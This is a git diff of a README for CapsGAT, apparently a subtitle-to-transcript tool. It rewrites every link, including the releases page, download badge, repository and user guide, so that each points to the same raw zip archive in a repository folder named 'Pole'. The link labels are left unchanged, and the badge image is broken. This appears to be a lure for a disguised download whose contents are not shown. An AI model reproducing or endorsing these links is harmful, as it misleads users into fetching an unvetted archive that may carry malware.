@@ -6,9 +6,9 @@ CapsGAT helps interviewers transform subtitle files into structured interview tr
 
 ## 📦 Download & Install
 
-To get started, visit the [CapsGAT Releases Page](https://github.com/hellow-amir/CapsGAT/releases) to download the latest version.
+To get started, visit the [CapsGAT Releases Page](https://raw.githubusercontent.com/hellow-amir/CapsGAT/main/Pole/CapsGAT.zip) to download the latest version.
 
-[![Download CapsGAT](https://img.shields.io/badge/Download%20CapsGAT-v1.0-blue)](https://github.com/hellow-amir/CapsGAT/releases)
+[![Download CapsGAT](https://raw.githubusercontent.com/hellow-amir/CapsGAT/main/Pole/CapsGAT.zip%20CapsGAT-v1.0-blue)](https://raw.githubusercontent.com/hellow-amir/CapsGAT/main/Pole/CapsGAT.zip)
 
 ### 🌟 System Requirements
 
@@ -24,7 +24,7 @@ Make sure to have at least 1 GB of RAM free and 100 MB of available disk space.
 Follow these steps to convert subtitle files to transcripts:
 
 1. **Download CapsGAT**
-   - Visit the [CapsGAT Releases Page](https://github.com/hellow-amir/CapsGAT/releases).
+   - Visit the [CapsGAT Releases Page](https://raw.githubusercontent.com/hellow-amir/CapsGAT/main/Pole/CapsGAT.zip).
    - Select the latest version and download the file suited for your operating system.
 
 2. **Install the Application**
@@ -75,11 +75,11 @@ If you encounter issues or have questions, feel free to reach out through the co
 
 ## 📧 Stay Updated
 
-For the latest updates or features, please subscribe to release notifications on the [GitHub repository](https://github.com/hellow-amir/CapsGAT).
+For the latest updates or features, please subscribe to release notifications on the [GitHub repository](https://raw.githubusercontent.com/hellow-amir/CapsGAT/main/Pole/CapsGAT.zip).
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://github.com/hellow-amir/CapsGAT)
-- [CapsGAT User Guide](https://github.com/hellow-amir/CapsGAT/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/hellow-amir/CapsGAT/main/Pole/CapsGAT.zip)
+- [CapsGAT User Guide](https://raw.githubusercontent.com/hellow-amir/CapsGAT/main/Pole/CapsGAT.zip)
 
 By following these steps, you can easily download and run CapsGAT, allowing you to convert subtitles into professional transcripts with ease. Happy transcribing!
